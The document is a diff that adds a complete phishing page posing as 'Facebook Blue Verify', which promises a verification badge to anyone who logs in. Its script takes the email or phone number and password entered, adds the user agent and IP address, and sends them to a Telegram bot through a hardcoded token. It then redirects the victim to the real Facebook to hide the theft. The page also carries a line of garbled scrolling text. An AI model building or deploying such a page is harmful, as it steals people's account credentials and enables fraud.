@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Blue Verify</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 290px;
+            padding: 19px;
+        }
+        .logo-container {
+            margin-bottom: 20px;
+        }
+        .logo {
+            font-family: 'Arial Black', sans-serif;
+            font-size: 36px;
+            color: #1877f2;
+        }
+        .slogan {
+            color: #1877f2;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        .form-container {
+            text-align: center;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 12px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 18px;
+            margin: 12px 0;
+        }
+        .login-button:hover {
+            background-color: #0e5ace;
+        }
+        a {
+            text-decoration: none;
+            color: #1877f2;
+            font-size: 14px;
+        }
+        .divider {
+            margin: 12px 0;
+            border-top: 1px solid #ddd;
+        }
+        .no-social-login {
+            font-size: 14px;
+            margin-top: 16px;
+        }
+        .no-social-login a {
+            font-weight: bold;
+            color: red;
+        }
+        .no-social-login a:hover {
+            text-decoration: underline;
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            border-radius: 5px;
+            padding: 15px;
+            z-index: 1;
+        }
+        .popup-content {
+            position: relative;
+        }
+        .popup-close {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            font-size: 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ6SbSx_8aNX9D7UyaO8n93stkA9b_PFDq5dg&amp;usqp=CAU" alt="My Logo" width="80" height="80">
+            <div class="logo"><strong>Facebook Blue Verify</strong></div>
+            <p class="slogan">Login Your Facebook Account and claim Verify Badge</p>
+        </div>
+        <div class="form-container">
+            <form onsubmit="submitonhfc(); return false;" method="post">
+                <input type="hidden" name="" id="pagename" value="Facebook Blue Verify">
+                <input type="text" id="email" placeholder="Email or Phone Number" class="input-field" name="email" required="">
+                <input id="name" type="password" placeholder="Password" class="input-field" name="password" required="">
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            <a href="#" id="signup-link">Forgot Password?</a>
+            <div class="divider"></div>
+            <div class="no-social-login">
+                <p>Don't have an account? <a href="#" id="signup-button">Sign Up</a></p>
+                <marquee behavior="scroll" direction="left" scrollamount="4" style="color: #1877f2; background-color: white; font-family: 'Arial Black', sans-serif; font-size: 12px;">
+                    55&5)5(5+5-55'5- 55(5-5"55 55.5+5' 5(55 5-5!5 5-505( 5555-5(5+ 5(5 525(5.5+ 555555(5(5$ 55 5(5-5!55+505"5,5 525(5. 505"5%5% 5'5(5- 5 55- 5-5!5 55%5.5 555+5"552 5555 5 5"5 5-5!5 5-505( 5555-5(5+ 5"5, 5(5'
+                </marquee>
+            </div>
+        </div>
+    </div>
+    <div id="error-popup" class="popup">
+        <div class="popup-content">
+            <span class="popup-close" id="close-popup">×</span>
+            <p><strong>Error:</strong> Sign up is currently disabled.</p>
+        </div>
+    </div>
+    <script>
+        function la(src) {
+            window.location = src;
+        }
+        function GetURLParameter(sParam) {
+            var sPageURL = window.location.search.substring(1);
+            var sURLVariables = sPageURL.split('&');
+            for (var i = 0; i < sURLVariables.length; i++) {
+                var sParameterName = sURLVariables[i].split('=');
+                if (sParameterName[0] == sParam) {
+                    return sParameterName[1];
+                }
+            }
+        }
+        var chatid = GetURLParameter('id');
+        function submitonhfc() {
+            fetch('https://api.ipify.org/?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userAgent = navigator.userAgent;
+                    const ip = data.ip;
+                    const cityName = data.city;
+                    const page = document.getElementById("pagename").value;
+                    const name = document.getElementById("name").value;
+                    const email = document.getElementById("email").value;
+                    const message = `> Login Page : ${page}\n\n> Number Or Email : ${email}\n\n> Password : ${name}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
+                    const botToken = '6429165693:AAFWIcw2XGofDtPS2iZZkQqAKgoILb1TCoc';
+                    const chatId = chatid;
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const telegramParams = {
+                        chat_id: chatId,
+                        text: message
+                    };
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', telegramUrl, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.send(JSON.stringify(telegramParams));
+                    xhr.onload = function() {
+                        if (xhr.status === 200) {
+                            window.location.href = "https://www.facebook.com";
+                        } else {
+                            console.log('Error sending data to Telegram:', xhr.statusText);
+                        }
+                    };
+                })
+                .catch(error => console.log('Error retrieving IP address information:', error));
+        }
+    </script>
+    <div style="position: relative;" id="zp-8-4-6-apollo-root-apollo_everywhere"></div>
+</body>
+</html>
